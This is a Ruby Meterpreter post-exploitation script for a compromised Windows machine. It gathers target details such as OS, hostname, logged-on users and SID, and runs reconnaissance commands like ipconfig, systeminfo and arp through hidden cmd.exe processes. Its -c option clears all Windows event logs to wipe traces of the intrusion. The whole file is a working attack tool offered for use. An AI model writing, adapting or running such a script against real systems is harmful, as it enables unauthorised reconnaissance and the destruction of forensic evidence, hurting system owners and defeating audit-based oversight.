
argument = 0
@exec_opts = Rex::Parser::Arguments.new(

"-h" => [false, "This help menu"],
"-n" => [false, "Normal Information about the target"],
"-l" => [false,"Long information about the target"],
"-c" => [false,"Clear event logs"]
)
meter_type = client.platform



#################USAGE##################
def usage
   print_good("Meterpreter Script to get some information about the target and clear Event Logs")
   print_line(@exec_opts.usage)
raise Rex::Script::Completed
end

##################CLEARLOG###############

def clear(session)

    
        print_good("Starting cleaning logs ..")
	sleep 1
        print_status("Don't forget, you must have an root acces ")
	
    print_status("Clearing Event Logs ")
    begin
        eventlog_list.each do |evl|
            print_status("Clearing the #{evl} Event Log")
            log = session.sys.eventlog.open(evl)
            print_status("#{log.clear}")
	    print_good("Done..")
        end
        print_good("All Event Logs have been cleared")
    rescue ::Exception => e
        print_status("Error clearing Event Log: #{e.class} #{e}")

    end
end

##################SINFO##################

def nInfo(session)

begin 

sysinfo = session.sys.config.sysinfo
getuid = session.sys.config.getuid
getsid = session.sys.config.getsid
getpid = session.sys.process.getpid

print_status("[    You are in : #{client}")
print_good("\n")
sleep 1
print_status("[    The Os of the target is : #{sysinfo['OS']}")
sleep 1
print_status("[    The Host Name is        : #{sysinfo['Computer']} ")
sleep 1
print_status("[    The Architecture is     : #{sysinfo['Architecture']}")
sleep 1
print_status("[    Logged On Users         : #{sysinfo['Logged On Users']}")
sleep 1
print_status("[    Script running as       : #{getuid}               ")
sleep 1
print_status("[    The PID of the session  : #{getpid}")
sleep 1
print_status("[    The SID of the user     : #{getsid}")
sleep 1

rescue ::Exception => e
   print_error("The following error was finded : #{e}")
   end
end

############################EXEC_CMDLST#########################

def exec_cmdlst(session,cmdlst)

begin
r=''
session.response_timeout=120
cmdlst.each do |cmd|
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
  end
  rescue ::Exception => e
 print_error("Error using command #{cmd}")
end
end


##########################ARGS#############################

@exec_opts.parse(args) { | opt,idx,val|
   case opt
   when "-h"
      argument = 1
      usage
   when "-n"
    argument = 1
    commands = [ "ipconfig /all","systeminfo"]
    exec_cmdlst(client,commands)
    nInfo(client)
   when "-l"
    argument = 1
    commands = [ "set","ipconfig /all","arp -a","systeminfo
"]
   exec_cmdlst(client,commands)
   nInfo(client)
   when "-c"
    argument = 1
    clear(client)
    
end
}

if (argument == 0)
then 
print_status("Lunching default information..")
sleep 1
nInfo(client)
end
print_good("Script finished ...")
   

